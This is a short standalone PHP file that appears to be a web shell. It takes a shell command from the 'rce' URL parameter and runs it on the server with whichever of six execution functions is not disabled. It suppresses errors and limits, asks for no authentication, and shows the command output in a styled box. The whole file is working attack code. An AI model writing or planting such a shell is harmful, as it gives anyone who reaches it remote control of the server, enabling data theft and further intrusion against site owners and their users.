<?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
if (isset($_GET['rce'])) {
    $cmd = $_GET['rce'];
    $output = '';
    $method = 'none';

    $functions = [
        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
        'proc_open' => function($c) {
            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
            return '';
        },
        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; }
        //,'backticks' => function($c) { return `$c 2>&1`; }
        ];

    foreach ($functions as $name => $func) {
        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
            $output = $func($cmd);
            $method = $name;
            break;
        }
    }

    echo '<div style="background:#1e1e1e; color:#00ff00; font-family:Courier,monospace; padding:10px; border:1px solid #333; margin:10px 0; border-radius:4px; overflow:auto;">';
    echo '<strong>[' . htmlspecialchars($method) . ']</strong> >>  ' . htmlspecialchars($cmd) . "\n <hr>";
    if ($output !== '') {
        echo nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
    } else {
        echo '[No output or command failed]';
    }
    echo '</div>';
}
?>   